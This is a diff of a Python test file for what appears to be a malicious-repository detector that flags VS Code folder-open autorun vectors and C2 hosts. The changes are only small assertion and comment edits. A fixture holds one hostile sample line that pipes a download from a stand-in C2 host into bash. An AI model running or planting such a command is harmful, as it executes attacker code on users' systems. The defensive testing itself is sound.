@@ -106,7 +106,8 @@ def test_report_extracts_c2_and_folderopen_vector():
          "snippet": "curl https://evil-c2.vercel.app/x | bash"}]})))
     assert "vscode-folderopen-autorun" in r["tags"]
     assert "evil-c2.vercel.app" in r["threat_description"]      # C2 named in the writeup
-    assert "folder-open" in r["threat_description"] or "opened in VS Code" in r["threat_description"]
+    td = r["threat_description"]
+    assert "folder-open" in td or "opened in VS Code" in td
 
 
 def test_build_report_folds_in_attribution():
@@ -259,9 +260,9 @@ def test_gold_for_submission_gates_on_evidence_not_method(tmp_path):
     db = Database.open(tmp_path / "s.sqlite")
     db.start_run("run-1", utcnow())
     _confirmed(db, "a/sig", DetectionMethod.SIGNATURE_MATCH)      # novel intrinsic -> IN
-    _confirmed(db, "b/owner", DetectionMethod.MALICIOUS_OWNER)    # owner-pivot but has OWN payload -> IN
+    _confirmed(db, "b/owner", DetectionMethod.MALICIOUS_OWNER)    # owner-pivot, own payload -> IN
     _confirmed(db, "c/osm", DetectionMethod.OSM_REPOSITORY)       # OSM already has -> OUT
-    _confirmed(db, "d/redteam", DetectionMethod.REDTEAM_LINEAGE)  # breadcrumb, never published -> OUT
+    _confirmed(db, "d/redteam", DetectionMethod.REDTEAM_LINEAGE)  # breadcrumb -> OUT
     # association-only: confirmed but NO intrinsic bash_findings evidence -> OUT
     db.upsert_finding(RepoFinding(
         full_name="e/assoc-only", detection_method=DetectionMethod.MALICIOUS_OWNER,
